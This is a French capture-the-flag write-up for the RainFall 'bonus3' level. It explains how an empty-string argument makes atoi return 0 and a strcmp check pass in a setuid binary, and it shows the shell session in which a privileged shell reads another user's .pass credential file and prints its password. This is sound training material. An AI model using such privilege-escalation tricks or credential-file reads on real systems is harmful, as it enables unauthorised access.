## Comportement
- J'ai des droits `bonus3` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3*`
- En exécutant le binaire (`./bonus3`), on observe qu'il print un retour a la ligne quand on lui passe un argument.
    ```shell
        bonus3@RainFall:~$ ./bonus3
        bonus3@RainFall:~$ ./bonus3 123

        bonus3@RainFall:~$ ./bonus3 123 ABC
        bonus3@RainFall:~$
    ```


## Analyse
- Le programme nécessite au moins 1 argument (argv[1]) sinon il se termine. De plus, le programme lit le fichier .pass pour le niveau suivant et le stocke dans un tampon via `fread()`.
- Appel a `atoi()` avec argv[1] comme paramètre et utilise le résultat comme index pour notre tampon, à cet index le programme insère un octet nul.
- Après cela, le programme effectue une comparaison sur notre buffer, il doit être égal à argv[1] pour que nous exécutions un shell.


## Résolution
- On veut eviter la comparaison. On peut le faire en entrant une chaîne vide comme premier argument, `atoi()` renverra 0 puisque la chaîne ne contient pas de représentation de valeur numérique. Par conséquent, il remplacera le premier caractère dans le tampon par un `\0` (buffer[atoi("")] = 0), et puisque `strcmp()` s'arrête à \0, les deux chaînes seront considérées comme identiques 
```shell
    bonus3@RainFall:~$ ./bonus3 ""
    $ whoami
    end
    $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
    $ exit
    bonus3@RainFall:~$ su end
    Password:
    end@RainFall:~$ ls -l
    total 4
    -rwsr-s---+ 1 end users 26 Sep 23  2015 end
    end@RainFall:~$ cat end
    Congratulations graduate!
end@RainFall:~$
```
